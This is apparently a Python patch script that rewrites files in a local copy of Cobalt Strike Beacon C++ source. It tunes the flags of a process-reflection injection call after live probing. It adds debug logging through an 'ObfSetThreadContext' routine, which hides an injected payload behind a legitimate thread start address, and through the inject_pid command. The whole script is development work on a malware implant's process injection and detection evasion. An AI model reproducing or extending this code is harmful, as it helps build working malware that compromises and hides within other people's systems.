#!/usr/bin/env python3
import io

BASE = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src"

# 1) inject_tier2.cpp: flags 3 -> 2 (live-probed: SUSPENDED|NO_SYNCHRONIZE
#    combos are rejected with INVALID_PARAMETER_2/5 on this build; plain
#    INHERIT_HANDLES returns success)
p = BASE + r"\inject_tier2.cpp"
s = io.open(p, encoding="utf-8").read()
old = """	st = pReflect(GetCurrentProcess(),
	              0x1 | 0x2, /* INHERIT_HANDLES | NO_SYNCHRONIZE (PoC flags) */
	              lpStartAddress, lpParameter, NULL, &info);"""
assert s.count(old) == 1
s = s.replace(old, """	/* flags: INHERIT_HANDLES only. The SUSPENDED/NO_SYNCHRONIZE combos the
	 * public PoCs use are rejected on this build (live matrix: 3 -> 0xC00000F0
	 * INVALID_PARAMETER_2, 0xA -> 0xC00000F3 with and without an event;
	 * plain 0x2 returns STATUS_SUCCESS). Struct per phnt: thread handle
	 * first, then the CLIENT_ID - logged only, nothing depends on it. */
	st = pReflect(GetCurrentProcess(), 0x2, lpStartAddress, lpParameter, NULL, &info);"""
)
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("reflect flags fixed")

# 2) obf chain: stage probes in spawn_trace.txt
old2 = """/* 4.11 ObfSetThreadContext: legit start address, payload via context */
BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
#if !defined _M_X64
	/* 4.11 constraint: same architecture, x64 only */
	return FALSE;
#else
	HANDLE hThread = NULL;
	void * legit = NULL;
	CONTEXT c;

	/* same architecture only (4.11 constraint) */
	if (!context->sameArch) {
		return FALSE;
	}

	/* a suspended target already has a legitimate start address - the plain
	 * SetThreadContext opcode handles that case; this one targets running
	 * processes where we mint a new, legitimately-started thread */
	if (context->isSuspended) {
		return FALSE;
	}

	legit = remote_exe_entry_x64(context->hProcess);
	if (legit == NULL) {
		return FALSE;
	}

	hThread = beacon_CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)legit, lpParameter, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		return FALSE;
	}
"""
assert s.count(old2) == 1
new2 = """/* 4.11 ObfSetThreadContext: legit start address, payload via context */
BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
#if !defined _M_X64
	/* 4.11 constraint: same architecture, x64 only */
	return FALSE;
#else
	HANDLE hThread = NULL;
	void * legit = NULL;
	CONTEXT c;

	spawn_log("obf: chain entry pid=", (long)context->pid);

	/* same architecture only (4.11 constraint) */
	if (!context->sameArch) {
		spawn_log("obf: FAIL arch mismatch", 0x7fffffff);
		return FALSE;
	}

	/* a suspended target already has a legitimate start address - the plain
	 * SetThreadContext opcode handles that case; this one targets running
	 * processes where we mint a new, legitimately-started thread */
	if (context->isSuspended) {
		spawn_log("obf: FAIL suspended target", 0x7fffffff);
		return FALSE;
	}

	legit = remote_exe_entry_x64(context->hProcess);
	if (legit == NULL) {
		spawn_log("obf: FAIL remote entry walk", 0x7fffffff);
		return FALSE;
	}
	spawn_log("obf: legit entry=", (long)(long long)legit);

	hThread = beacon_CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)legit, lpParameter, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		spawn_log("obf: FAIL CreateRemoteThread gle=", (long)GetLastError());
		return FALSE;
	}
	spawn_log("obf: CRT ok thread=", (long)(long long)hThread);
"""
s = s.replace(old2, new2)

old3 = """	if (!GetThreadContext(hThread, &c)) {
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}"""
assert s.count(old3) == 1
s = s.replace(old3, """	if (!GetThreadContext(hThread, &c)) {
		spawn_log("obf: FAIL GetThreadContext gle=", (long)GetLastError());
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}
	spawn_log("obf: GTC ok orig rip=", (long)c.Rip);""")

old4 = """	{
		void * ustart = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
		if (ustart == NULL) {
			TerminateThread(hThread, 0);
			CloseHandle(hThread);
			return FALSE;
		}
		c.Rcx = (DWORD64)lpStartAddress;
		c.Rdx = (DWORD64)lpParameter;
		c.Rip = (DWORD64)ustart;
	}"""
assert s.count(old4) == 1
s = s.replace(old4, """	{
		void * ustart = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
		if (ustart == NULL) {
			spawn_log("obf: FAIL no RtlUserThreadStart", 0x7fffffff);
			TerminateThread(hThread, 0);
			CloseHandle(hThread);
			return FALSE;
		}
		c.Rcx = (DWORD64)lpStartAddress;
		c.Rdx = (DWORD64)lpParameter;
		c.Rip = (DWORD64)ustart;
	}""")

old5 = """	if (!SetThreadContext(hThread, &c)) {
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}

	ResumeThread(hThread);
	CloseHandle(hThread);
	return TRUE;"""
assert s.count(old5) == 1
s = s.replace(old5, """	if (!SetThreadContext(hThread, &c)) {
		spawn_log("obf: FAIL SetThreadContext gle=", (long)GetLastError());
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		return FALSE;
	}

	ResumeThread(hThread);
	CloseHandle(hThread);
	spawn_log("obf: resumed, payload=", (long)(long long)lpStartAddress);
	return TRUE;"""
)

# remote_exe_entry_x64 failure stages
old6 = """	pebaddr = pbi.PebBaseAddress;
	if (!beacon_ReadProcessMemory(hProcess, (char *)pebaddr + 0x10, &imagebase, 8, &got) || got != 8) {
		return NULL;
	}

	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase, dos, 0x40, &got) || got != 0x40) {
		return NULL;
	}

	if (dos[0] != 'M' || dos[1] != 'Z') {
		return NULL;
	}"""
assert s.count(old6) == 1
s = s.replace(old6, """	pebaddr = pbi.PebBaseAddress;
	if (!beacon_ReadProcessMemory(hProcess, (char *)pebaddr + 0x10, &imagebase, 8, &got) || got != 8) {
		spawn_log("obf: walk FAIL read imagebase gle=", (long)GetLastError());
		return NULL;
	}
	spawn_log("obf: walk imagebase=", (long)(long long)imagebase);

	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase, dos, 0x40, &got) || got != 0x40) {
		spawn_log("obf: walk FAIL read dos gle=", (long)GetLastError());
		return NULL;
	}

	if (dos[0] != 'M' || dos[1] != 'Z') {
		spawn_log("obf: walk FAIL no MZ (stomped headers?)", 0x7fffffff);
		return NULL;
	}"""
)
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("obf probes in")

# 3) hotbeef: trace the inject_pid path too
p2 = BASE + r"\hotbeef.cpp"
s2 = io.open(p2, encoding="utf-8").read()
i = s2.find("void command_inject_pid(char * buffer, int length, BOOL x86) {")
assert i > 0
s2 = s2[:i] + 'void command_inject_pid(char * buffer, int length, BOOL x86) {\n\tspawn_log("inject_pid: entry len=", (long)length);\n' + s2[i + len("void command_inject_pid(char * buffer, int length, BOOL x86) {"):]
io.open(p2, "w", encoding="utf-8", newline="").write(s2)
print("inject_pid entry probe in")
